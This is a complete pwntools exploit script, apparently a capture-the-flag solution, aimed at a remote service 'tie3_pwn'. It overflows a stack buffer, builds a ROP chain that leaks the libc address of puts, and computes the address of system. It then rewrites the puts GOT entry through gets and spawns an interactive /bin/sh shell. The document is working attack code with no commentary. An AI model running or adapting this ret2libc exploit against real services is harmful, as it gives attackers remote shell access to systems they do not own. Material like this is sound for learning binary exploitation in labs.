from pwn import *
#context.log_level = 'debug'
target = remote('172.16.10.149',6666)
elf = ELF('./tie3_pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
ret2_rip = 0x4006f3
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
gets_plt = elf.plt['gets']
off_puts = libc.symbols['puts']
off_system = libc.symbols['system']
payload = 'X' * 40 + p64(ret2_rip) + p64(puts_got) + p64(puts_plt)
payload += p64(ret2_rip) + p64(puts_got) + p64(gets_plt)
payload += p64(ret2_rip) + p64(puts_got + 8) + p64(puts_plt)
target.recvuntil(':')
target.sendline(payload)
target.recvuntil('3\n')
addr_puts = u64(target.recvuntil('\n')[:-1].ljust(8,"\x00"))
base_libc = addr_puts - off_puts
addr_sys = base_libc + off_system
print '#' * 15 + 'leak info' + '#' * 15
print 'address of puts is :' + hex(addr_puts)
print 'address of libc base is ' + hex(base_libc)
print 'address of system is :' + hex(addr_sys)
print '#' * 39
print '           exploit--->getshell'
target.sendline(p64(addr_sys) + '/bin/sh\x00')
print '#' * 39
target.interactive()